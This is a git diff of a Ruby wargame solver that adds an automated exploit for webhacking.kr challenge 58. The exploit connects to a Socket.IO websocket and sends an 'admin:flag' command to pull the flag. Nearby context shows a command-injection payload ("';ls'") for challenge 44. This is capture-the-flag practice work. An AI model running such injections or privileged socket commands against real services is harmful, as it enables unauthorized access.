@@ -5,6 +5,8 @@ require 'base64'
 require 'resolv'
 require 'docx'
 require 'securerandom'
+require 'websocket-eventmachine-client'
+require 'json'
 
 module WebhackingKR
   ##
@@ -1151,7 +1153,7 @@ module WebhackingKR
   class Challenge44 < ChallengeBase
     CHALLENGE = 44
 
-    PORT = 10005
+    PORT = 10_005
     PATH = '/'
     PARAM_ID = 'id'
     PAYLOAD = "';ls'"
@@ -1324,6 +1326,72 @@ module WebhackingKR
 
       log("Password: #{password}")
       check(auth(password))
+    end
+  end
+
+  ##
+  # Challenge 58
+  class Challenge58 < ChallengeBase
+    CHALLENGE = 58
+
+    PORT = 10_007
+    PATH = '/socket.io/'
+    PARAM_EIO = 'EIO'
+    PARAM_TRANSPORT = 'transport'
+    SOCKET_EIO = 3
+    SOCKET_TRANSPORT = 'websocket'
+    PAYLOAD = ['cmd', 'admin:flag'].freeze
+
+    def exec
+      EM.run do
+        uri = URI(Wargame::BASE_URI)
+        uri.scheme = 'ws'
+        uri.port = PORT
+        uri.path = PATH
+        uri.query = URI.encode_www_form(
+          PARAM_EIO => SOCKET_EIO,
+          PARAM_TRANSPORT => SOCKET_TRANSPORT
+        )
+        log('Connecting to the websocket')
+        ws = WebSocket::EventMachine::Client.connect(uri: uri.to_s)
+
+        ws.onopen do
+          log('Connected')
+        end
+
+        ws.onclose do
+          log('Disconnected')
+          return
+        end
+
+        ws.onmessage do |message|
+          case message[0]
+          when '0'
+            log('Socket.IO is opened')
+            data = JSON.parse(message[1..-1])
+            EventMachine::PeriodicTimer.new(data['pingInterval'] / 1000) do
+              ws.send(2)
+            end
+
+            log('Sending payload')
+            data = JSON.generate(PAYLOAD)
+            ws.send("4#{PAYLOAD.length}#{data}")
+
+          when '4'
+            if message[1].to_i.positive?
+              data = JSON.parse(message[2..-1])
+              unless data.instance_of?(Array) && data[1] =~ /^FLAG{.*}$/
+                failed
+                ws.close
+              end
+
+              log("Flag: #{data[1]}")
+              check(auth(data[1]))
+              ws.close
+            end
+          end
+        end
+      end
     end
   end
 
